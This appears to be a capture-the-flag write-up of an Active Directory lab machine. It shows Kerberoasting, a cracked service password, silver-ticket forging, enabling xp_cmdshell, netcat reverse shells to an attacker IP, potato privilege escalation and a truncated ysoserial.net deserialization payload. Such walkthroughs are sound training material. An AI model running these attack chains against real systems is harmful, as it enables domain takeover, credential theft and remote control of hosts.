### Host: 10.10.11.168
If Active Directory => Synchronize your NTP with the domain controller:
```bash
nptdate 10.10.10.103
```
### Content

- LDAP Enumeration
* Web Enumeration
* Information Leakage
* Kerberos Enumeration
* Kerbrute Password Brute Force
* Kerbrute SMB Enumeration
* Kerberos Authentication [getTGT.py]
* ASREPRoast Attack - GetNPUsers.py (Failed)
* Kerberoasting Attack - GetUserSPNs.py Manipulating the GetUserSPNs.py script to make it work the way we want it to work
* Cracking Hashes
* Attempting to authenticate to the MSSQL service via kerberos (Failed)
* Explaining Kerberos Auth Flow (TGT, TGS, KDC, AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP)
* Explaining how Silver Ticket Attack works
* Silver ticket attack. Forging a new TGS as Administrator user (NTLM Hash, Domain SID and SPN) ticketer.py && getPAC.py
* CCACHE Technique Connecting to the MSSQL service with the newly created ticket
* MSSQL Enumeration
* Enabling xp_cmdshell component in MSSQL [RCE]
* Abusing SeImpersonatePrivilege [JuicyPotatoNG Alternative for Windows Server 2019](https://github.com/antonioCoco/JuicyPotatoNG) (Unintended Way)
* Binary and DLL Analysis
* Downloading OpenVPN from a Windows machine and configuring it to reverse downloaded resources
* Dnspy Installation
* DLL Inspection with Dnspy - Found a backdoor in the code
* We realize that serialization and deserialization of data is being used
* Creating a malicious base64 serialized Payload with ysoserial.net in order to get RCE and send the serialized data to the server [Privilege Escalation]
### Reconnaissance

Initial reconnaissance for TCP ports

```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.11.168
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.168 ()   Status: Up
Host: 10.10.11.168 ()   Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 4411/open/tcp//found///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49693/open/tcp/////, 49701/open/tcp/////
```

Services and Versions running:

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49693,49701 -sCV -Pn -n -vvv -oN targeted 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up, received user-set (0.083s latency).
Scanned at 2023-01-21 21:14:39 EST for 196s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-01-22 02:14:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-01-22T02:17:55+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233

|_ssl-date: 2023-01-22T02:17:55+00:00; +1s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-22T02:10:57
| Not valid after:  2053-01-22T02:10:57
| MD5:   341cc0972d8318f67a4451492b27b778
| SHA-1: 3bfa57e2c60a0afb4010dffa4dfb8a377c5cb3be

|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-01-22T02:17:55+00:00; +1s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
|_ssl-date: 2023-01-22T02:17:55+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
|_ssl-date: 2023-01-22T02:17:55+00:00; +1s from scanner time.
4411/tcp  open  found?        syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2023-01-22T02:17:16
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42300/tcp): CLEAN (Timeout)
|   Check 2 (port 15149/tcp): CLEAN (Timeout)
|   Check 3 (port 41902/udp): CLEAN (Timeout)
|   Check 4 (port 31813/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Crackmapexec output:

```bash
crackmapexec smb 10.10.11.168          
SMB 10.10.11.168 445 NONE [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
```

There is a hostname in the port LDAP 3269:

```bash
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
```

Adding this to the /etc/hosts for further attacks:
```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.168    DC1.scrm.local
```

Enumeration with LDAP basic query: ^b0249d
```bash
ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Enumeration (failed) with LDAP query to retrieve users:

```bash
ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts -b "dc=scrm,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=scrm,dc=local> with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Trying to connect to database using domain controller: ^8adc8a
```bash
impacket-mssqlclient scrm.local/sa:sa@10.10.11.168
```

Enumerating website we found a webpage with information disclosure:

![[Pasted image 20230121214935.png]]

Kerberos user enumeration with kerbrute: ^68a075
```bash
kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Kerberos/A-ZSurnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop

2023/01/21 22:44:31 >  Using KDC(s):
2023/01/21 22:44:31 >   10.10.11.168:88

2023/01/21 22:44:31 >  [+] VALID USERNAME:       ASMITH@scrm.local
2023/01/21 22:45:06 >  [+] VALID USERNAME:       JHALL@scrm.local
2023/01/21 22:45:11 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2023/01/21 22:45:13 >  [+] VALID USERNAME:       KHICKS@scrm.local
2023/01/21 22:45:44 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2023/01/21 22:46:15 >  Done! Tested 13000 usernames (5 valid) in 104.092 seconds
```

### Exploitation

^b7b22a
Trying to execute an ASREPRoast Attack with the previously found usernames:
```bash
impacket-GetNPUsers scrm.local/ -no-pass -usersfile ../content/validUsers
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ASMITH@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JHALL@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KSIMPSON@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KHICKS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SJENKINS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Often, users use username as password to test this we can use kerbrute to test it with Password Sprayin:
```bash
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local validUsers ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop

2023/01/21 23:30:54 >  Using KDC(s):
2023/01/21 23:30:54 >   10.10.11.168:88

2023/01/21 23:30:55 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2023/01/21 23:30:55 >  Done! Tested 6 logins (1 successes) in 0.494 seconds
```

We then can abuse this for an ASREPRoast Attack, since NTLM is not working as per the following banner on the website:

![[Pasted image 20230121232537.png]]

We can use the "-k" parameter to try to extract Service Principal Names via kerberos with the following command: ^ca990a
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip DC1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

Unfortunately such script does not work properly. In order to fix this error we research on the Internet and this issue is due to the following:
![[Pasted image 20230121232652.png]]
Reference: [GetUserSNPs.py issue](https://github.com/fortra/impacket/issues/1206)

In order to fix this we need to change the code on the GetUserSpns.py script:

```python
    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
#            target = self.getMachineName()
            target = self.__kdcHost
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain
```

Then the script should be working with the following syntax:

```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775            
```

This retrieves the hash from the service sqlsvc: ^49c9c0
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$4339a757e8acc924ea3fcca7d2fa001c$eda1e8cc615a8e7146ba89f792bcc0a09c949b29b73c542fde645296fec54b2ba8144bd4385da66eed75f4e2c721000ff1b25a18542bd1b131a1bb4935ef40a652c68a239a089f5cffc95a935f8afd80bc66884f9726b7347572b28feba4c9629f9693b94ed650ecf700505549d4557d36ab7d48ec0e8cac521ffab1029227065a0bc64a6eb89a76394d846250d3e5a2238e5fb8ee5cc771f8bdd165ab665f2cb87a59e485489d7e27b4249560e68cbbffdb73f60c3172525c9e1ab87da3aedb9d0a4c9d049a7d6d9ccb8738037742e4927ef307b3433c94c90b57b6825a6969ffb50570807d56c96de79a7a8d9f760e24098d0e66ce3d26873928b3406f51d9095568cd05e9921eafcfb67edaca16bff62966c21824ca796737a912a1b0dbaa75104aca9ace866fa5de415acaec35f9b5e398cfb5353d0c9ebf8c0b1ddf826c5dec8f05f7b6b9066f347d10fc8cee01babc581ad14dcf41ee0c079f5e56848e02a42b567b599df197db0c382dd0c24703af049b8a2b906e62e627deb42df09351d270e04ed7b9fe058d8f08e52c0e828b8547ab8df48e718f53a875654e14a83fc364c226b4e09c3f852859805a645309d19ffc5ec15190508abfd02990b3601c5f69d4ea2c6126f2ee5ba82a8c8c1cfed0d33ea0949ffab5a3530090ffa24a5bd7f81ae9a8c9b1fce4cdefb49965835c618be36d22ea9bc5142708166cfbc71cb48212d535cbd8b20b3dfb6edd630c98c022124c09d6f411130711d398806938ce05fdd101aa9dcdb2b553eea86011a244a55789bb5c8bc4f7d6e1baa2ec8a89ed23bd64f788008ea66ffa0ac5c2898c2e953fb6649a156c62111387ee024808b11873cb7d404eca7a7b2e6067a6c1df0dcd4452dcf6c5cf17757ce408f2ed58c1e1de0acabb9e8826e2f0be5ab923e53b1c9311ed403efa5291e916d43868eeeee467e6004b8a7693468418aec93ec3cdcc5d7ee3fa51e8afa86c1b6846a8fd4e8b4b3a2b3672f56cb234a3dcad0da3ff8c370d6eaa3db6eab4aa760eb94496726278495b54819ad91579d11d465014a4ff9639b9fa843c5a022df0f6125eba91fa92c914d9ca2e62d2aded22d8cd162f05a0e1557b06322ed853de28871a5840493f06bad4cc2defd88129eba71ef2c69ae0cbe24f58a05b13a359f8698bd4fa9e107f4bc534f3c7e37d993aa5c28871a56490e81ba088116196b3b29d4a9aaf86b972d75138fab295e49fcc9296d1bf4feaadacb27cba3b60065fe0ff50c0c2b6d706934767fc60b0063578f1160bede62e649849b3b06f4a17a24ff8fe6dc3454c1d950aa9fd686c0e281fa426b935c79998af8cf9627ba534c98dce9bbd5986fd0d71ceba7f85b70a4d245c2cb10470733fce878b2151e700fc658ed38968febb55c6b4d4ad7901444dc5783dae49cf2faea6c119849304

```

After cracking this hash we can identify the password (Pegasus60) for user sqlsvc:
![[Pasted image 20230121233825.png]]
Since it is not possible to login to the account via impacket-mssqlclient due to the NTLM disabled authentication:
```bash
impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168 -windows-auth       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ("Unpacked data doesn't match constant value 'b'\\x14H\\x00\\x00\\x01\\x0ef\\x00'' should be ''NTLMSSP\\x00''", 'When unpacking field \' | "NTLMSSP\x00 | b\'\\x14H\\x00\\x00\\x01\\x0ef\\x00L\\x00o\\x00g\\x00i\\x00n\\x00 \\x00f\\x00a\\x00i\\x00l\\x00e\\x00d\\x00.\\x00 \\x00T\\x00h\\x00e\\x00 \\x00l\\x00o\\x00g\\x00i\\x00n\\x00 \\x00i\\x00s\\x00 \\x00f\\x00r\\x00o\\x00m\\x00 \\x00a\\x00n\\x00 \\x00u\\x00n\\x00t\\x00r\\x00u\\x00s\\x00t\\x00e\\x00d\\x00 \\x00d\\x00o\\x00m\\x00a\\x00i\\x00n\\x00 \\x00a\\x00n\\x00d\\x00 \\x00c\\x00a\\x00n\\x00n\\x00o\\x00t\\x00 \\x00b\\x00e\\x00 \\x00u\\x00s\\x00e\\x00d\\x00 \\x00w\\x00i\\x00t\\x00h\\x00 \\x00I\\x00n\\x00t\\x00e\\x00g\\x00r\\x00a\\x00t\\x00e\\x00d\\x00 \\x00a\\x00u\\x00t\\x00h\\x00e\\x00n\\x00t\\x00i\\x00c\\x00a\\x00t\\x00i\\x00o\\x00n\\x00.\\x00\\x03D\\x00C\\x001\\x00\\x00\\x01\\x00\\xfd\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\'[:8]\'')
```

Let's try another technique called [[Silver Ticket]] to apply this technique we need to generate a TGS without interacting with the KDC which is the responsible of granting tickets, for this we need 3 items: ^ac1e1e
* NTLM Hash
* DC SID
* SPN

Since we already have the password from the service account we can generate the hash with this tool: [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)
![[Pasted image 20230122001452.png]]

Next step is to extract the DC SID as well as the UserId with the following command:
```bash
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
... 
EffectiveName:                   'administrator' 
...
UserId:                          500 
...
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

Finally to extract the SPN we use the following command:
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-01-21 21:10:55.765775    
```

Then we create the silver ticket with impacket-ticketer as follows:
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-254252320 -dc-ip 10.10.11.168 10.10.11.168 -domain scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/10.10.11.168
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in 10.10.11.168.ccache
```
This ccache file is useful for a [[CCACHE TGT]]  technique:
```bash
export KRB5CCNAME=10.10.11.168.ccache
```
Then we can access to the MSSQL service:
```bash
impacket-mssqlclient dc1.scrm.local -k
                                         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```
And finally we can get a reverse shell by uploading the netcat.exe binary into the machine and then execute it:
```bash
SQL> xp_cmdshell"curl 10.10.14.2/nc.exe -o C:\Temp\nc.exe"
output                                                                             
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    

                                 Dload  Upload   Total   Spent    Left  Speed      

100 59392  100 59392    0     0   167k      0 --:--:-- --:--:-- --:--:--  168k

SQL> xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.14.2 443"
```

### User Privilege Escalation
##### Unintended Way:

We are user sqlsvc now we need to escalate to another user, it seems like miscsvc is a good option:
```bash
Directory of C:\Users

05/11/2021  14:56    <DIR>          .
05/11/2021  14:56    <DIR>          ..
05/11/2021  21:28    <DIR>          administrator
03/11/2021  19:31    <DIR>          miscsvc
26/01/2020  17:54    <DIR>          Public
01/06/2022  13:58    <DIR>          sqlsvc
```

Since we have access to the SMB via kerberos authentication we can try to access via impacket-smbclient:
```bash
impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
```
This gives us nothing other than some CLSIDs that we can try to enumerate with [[SeImpersonatePrivilege#^80958f]] but this didn't work since no CLSID allows us to execute a program as SYSTEM.

##### Intended Way

Once inside the database we start to enumerate and we found this info: ^516462
```bash
SQL> select name from master.sys.databases
SQL> use ScrambleHR
SQL> select * from information_schema.tables;
SQL> select * from UserImport;
LdapUser  LdapPwd  LdapDomain  RefreshInterval   IncludeGroups   --------  -------  ----------  ----------------  -------------   
MiscSvc   ScrambledEggs9900   scrm.local 
```

We can enable xp_cmdshell feature to execute commands from MSSQL: ^ec565c
```bash
SQL> xp_cmdshell"whoami"
[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

SQL> SP_CONFIGURE "show advanced options", 1
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE

SQL> SP_CONFIGURE "xp_cmdshell", 1
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE

SQL> xp_cmdshell"whoami"

output                                                                             

scrm\sqlsvc                                                                        
```

To connect with this user as we are inside the machine we can use powershell to connect as a different user:
```powershell
$user = 'scrm.local\miscsvc'

$password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($user, $password)

Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
```

### Privilege Escalation

^ee02ee
##### Unintended Way:

In order to escalate directly as root we abuse of JuicyPotatoNG which is an excellent tool for Windows Server 2019:
```bash
JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 1234"
```

##### Intended Way

Once that we are user miscsvc we start by enumerating the machine, we find the following two files:
```cmd
C:\Shares\IT\Apps\Sales Order Client>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Shares\IT\Apps\Sales Order Client

05/11/2021  20:57    <DIR>          .
05/11/2021  20:57    <DIR>          ..
05/11/2021  20:52            86,528 ScrambleClient.exe
05/11/2021  20:52            19,456 ScrambleLib.dll
               2 File(s)        105,984 bytes
               2 Dir(s)  15,990,923,264 bytes free
```

This file is within the share and as we have now credentials for this user we can connect via SMB and extract such files:
```cmd
impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k
# use IT
# cd Apps\Sales Order Client
# get ScrambleClient.exe
# get ScrambleLib.dll
```

This files are written in .NET Assembly which is actually debuggable, means that we can get the source code with DNSpy: ^3796f7
```bash
file Scramble*
ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
ScrambleLib.dll:    PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

After debugging with a Windows Server 2012 and extract the source code we found the following deserialization vulnerable code: ^564d19

![[Pasted image 20230122220052.png]]
Now the important thing is to found the vulnerable input where it can be exploited, after running the ScrambleClient.exe we can identify a debug functionality which gives us a hint about what is being executed with this executable:
![[Pasted image 20230122220636.png]]

Since this is .NET and there is a possible Deserialization vulnerability, we can generate the following payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net/releases/tag/v1.35)
```cmd
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2V